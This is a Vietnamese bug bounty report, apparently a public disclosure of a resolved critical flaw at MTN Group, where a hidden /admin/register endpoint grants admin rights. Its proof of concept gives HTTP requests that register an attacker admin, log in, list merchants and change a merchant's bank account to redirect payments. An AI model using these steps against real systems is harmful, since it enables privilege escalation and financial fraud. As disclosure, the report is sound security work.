## 🔓 **Báo cáo Lỗ hổng Truy cập Trái phép vào Bảng Điều Khiển Quản Trị**

**🆔 Report ID:** #2801787
**🎯 Mục tiêu:** MTN Group
**📆 Ngày báo cáo:** 24/10/2024
**📣 Trạng thái:** Đã giải quyết
**⚠️ Mức độ nghiêm trọng:** **Critical (9.1)**
**💰 Tiền thưởng:** Không tiết lộ
**🧠 Loại lỗ hổng:** Improper Access Control – Admin Panel Registration Bypass

---

## 1️⃣ **Mô tả tóm tắt**

Trong quá trình kiểm tra ứng dụng ████████, tôi phát hiện một **điểm cuối ẩn (`/admin/register`)** cho phép bất kỳ người dùng nào cũng có thể **tự đăng ký tài khoản quản trị**, mặc dù giao diện ứng dụng không cung cấp liên kết nào tới chức năng này.

Khai thác lỗ hổng này thành công giúp tôi:

* Truy cập vào **Admin Dashboard**.
* **Xem, sửa, xóa dữ liệu của tất cả tài khoản thương gia**.
* **Thay đổi thông tin tài khoản ngân hàng**, có thể chuyển hướng dòng tiền về attacker.
* Truy cập thông tin của các nhóm người dùng khác như **Giám sát viên, Trạm giao dịch, Thủ quỹ**.
* Xem được **thông tin xác thực (mã pin/mật khẩu)** của nhiều tài khoản.

---

## 2️⃣ **Các bước tái hiện chi tiết (PoC)**

> ⚠️ **Lưu ý:** Các URL và token đã được ẩn theo quy định công khai.

### Bước 1: Truy cập điểm cuối ẩn để đăng ký tài khoản quản trị

```
POST https://████████/admin/register

Payload:
{
  "name": "exploit_admin",
  "email": "attacker@example.com",
  "password": "StrongPass123!",
  "confirm_password": "StrongPass123!"
}
```

> 🟢 **Kết quả:** Đăng ký thành công tài khoản và được gán quyền *admin*.

---

### Bước 2: Đăng nhập tài khoản vừa tạo

```
POST https://████████/admin/login

Payload:
{
  "email": "attacker@example.com",
  "password": "StrongPass123!"
}
```

> 🟢 **Kết quả:** Đăng nhập thành công và được chuyển hướng tới **/admin/dashboard**

---

### Bước 3: Truy cập và chỉnh sửa dữ liệu nhạy cảm

#### ✅ Xem toàn bộ danh sách thương gia:

```
GET https://████████/admin/merchants
```

#### ✏️ Sửa thông tin tài khoản ngân hàng:

```
PUT https://████████/admin/merchant/123456

Payload:
{
  "account_number": "999999999999",
  "bank_name": "Attacker Bank"
}
```

> 🧨 Điều này có thể **chuyển hướng toàn bộ giao dịch tài chính** đến tài khoản do attacker kiểm soát.

---

## 3️⃣ **Ảnh hưởng bảo mật**

* **Privilege Escalation từ người dùng thường -> Quản trị viên**
* **Truy cập và thao túng dữ liệu nhạy cảm**
* **Thay đổi đường đi tài chính**
* **Vô hiệu hóa và xóa tài khoản người dùng khác**
* **Truy cập trái phép thông tin đăng nhập/mã PIN**

---




